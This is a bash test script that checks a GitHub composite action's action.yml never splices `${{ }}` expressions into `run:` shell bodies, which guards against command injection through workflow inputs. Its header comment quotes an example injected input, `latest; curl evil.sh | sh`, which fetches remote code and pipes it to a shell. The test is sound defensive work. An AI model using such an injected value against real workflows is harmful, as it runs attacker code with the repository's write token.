#!/usr/bin/env bash
# Proves action.yml never splices a GitHub expression into a shell script.
#
# GitHub substitutes `${{ ... }}` into the `run:` text before bash is invoked,
# so an input value becomes part of the program rather than an argument to it:
# a `cli-version` of `latest; curl evil.sh | sh` runs as two commands, with
# the action's own `contents: write` token in the environment. Routing the
# value through `env:` makes it data that the shell reads at runtime and can
# quote.
#
# The invariant is checked structurally against every step rather than by
# asserting on the two steps that exist today, so a third step added later
# cannot reintroduce the pattern unnoticed.
set -euo pipefail

TEST_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$TEST_DIR/.." && pwd)"
ACTION_YML="$REPO_ROOT/action.yml"

PASS=0
FAIL=0

run_test() {
  local name="$1"
  shift
  if "$@"; then
    echo "PASS: $name"
    PASS=$((PASS + 1))
  else
    echo "FAIL: $name"
    FAIL=$((FAIL + 1))
  fi
}

# Prints the body of every `run:` key, one line per line of script. Handles
# both the block form (`run: |`) and the inline form (`run: some-command`).
# Comment lines are stripped: a comment explaining the rule is not a use of it.
extract_run_bodies() {
  awk '
    # inline form — everything after "run:" on the same line
    /^[[:space:]]*run:[[:space:]]*[^|>[:space:]]/ {
      sub(/^[[:space:]]*run:[[:space:]]*/, "")
      print
      next
    }
    # block form — record the indent of the "run:" key itself
    /^[[:space:]]*run:[[:space:]]*[|>]/ {
      match($0, /^[[:space:]]*/)
      key_indent = RLENGTH
      in_block = 1
      next
    }
    in_block {
      if ($0 ~ /^[[:space:]]*$/) { next }
      match($0, /^[[:space:]]*/)
      if (RLENGTH <= key_indent) { in_block = 0; next }
      print
    }
  ' "$ACTION_YML" | sed 's/[[:space:]]*#.*$//'
}

test_no_run_body_interpolates_an_expression() {
  local bodies offenders
  bodies="$(extract_run_bodies)"

  if [ -z "$bodies" ]; then
    echo "  extracted no run: bodies at all — the extractor is broken, not the file"
    return 1
  fi

  offenders="$(printf '%s\n' "$bodies" | grep -F '${{' || true)"
  if [ -n "$offenders" ]; then
    echo "  a run: body interpolates a GitHub expression; route it through env: instead"
    printf '%s\n' "$offenders" | sed 's/^/    /'
    return 1
  fi
}

test_cli_version_reaches_the_shell_as_an_environment_variable() {
  if ! grep -qF 'CLI_VERSION: ${{ inputs.cli-version }}' "$ACTION_YML"; then
    echo "  expected cli-version to be bound to CLI_VERSION in an env: block"
    return 1
  fi
  if ! printf '%s\n' "$(extract_run_bodies)" | grep -qF '"@vocoder/cli@${CLI_VERSION}"'; then
    echo "  expected the translate step to read the pinned version from \$CLI_VERSION, quoted"
    return 1
  fi
}

test_commit_step_resolves_the_script_without_an_expression() {
  if ! printf '%s\n' "$(extract_run_bodies)" \
    | grep -qF '"$GITHUB_ACTION_PATH/scripts/commit-locale-files.sh"'; then
    echo "  expected the commit step to invoke the script via \$GITHUB_ACTION_PATH"
    return 1
  fi
}

# Guards the guard: an extractor that silently matched nothing would let every
# assertion above pass against a file full of violations.
test_extractor_actually_sees_a_planted_expression() {
  local fixture bodies
  fixture="$(mktemp)"
  cat > "$fixture" <<'YML'
runs:
  using: 'composite'
  steps:
    - name: Block form
      shell: bash
      run: |
        echo ${{ inputs.planted-block }}
    - name: Inline form
      shell: bash
      run: echo ${{ inputs.planted-inline }}
YML
  bodies="$(ACTION_YML="$fixture" bash -c '
    awk "
      /^[[:space:]]*run:[[:space:]]*[^|>[:space:]]/ {
        sub(/^[[:space:]]*run:[[:space:]]*/, \"\"); print; next
      }
      /^[[:space:]]*run:[[:space:]]*[|>]/ {
        match(\$0, /^[[:space:]]*/); key_indent = RLENGTH; in_block = 1; next
      }
      in_block {
        if (\$0 ~ /^[[:space:]]*\$/) { next }
        match(\$0, /^[[:space:]]*/)
        if (RLENGTH <= key_indent) { in_block = 0; next }
        print
      }
    " "$ACTION_YML"')"
  rm -f "$fixture"

  local found
  found="$(printf '%s\n' "$bodies" | grep -cF '${{' || true)"
  if [ "$found" -ne 2 ]; then
    echo "  extractor found $found planted expressions, expected 2 (block + inline)"
    printf '%s\n' "$bodies" | sed 's/^/    /'
    return 1
  fi
}

run_test "no run: body interpolates a GitHub expression" test_no_run_body_interpolates_an_expression
run_test "cli-version reaches the shell as a quoted environment variable" test_cli_version_reaches_the_shell_as_an_environment_variable
run_test "the commit step resolves its script via GITHUB_ACTION_PATH, not an expression" test_commit_step_resolves_the_script_without_an_expression
run_test "the extractor detects a planted expression in both block and inline run bodies" test_extractor_actually_sees_a_planted_expression

echo ""
echo "$PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
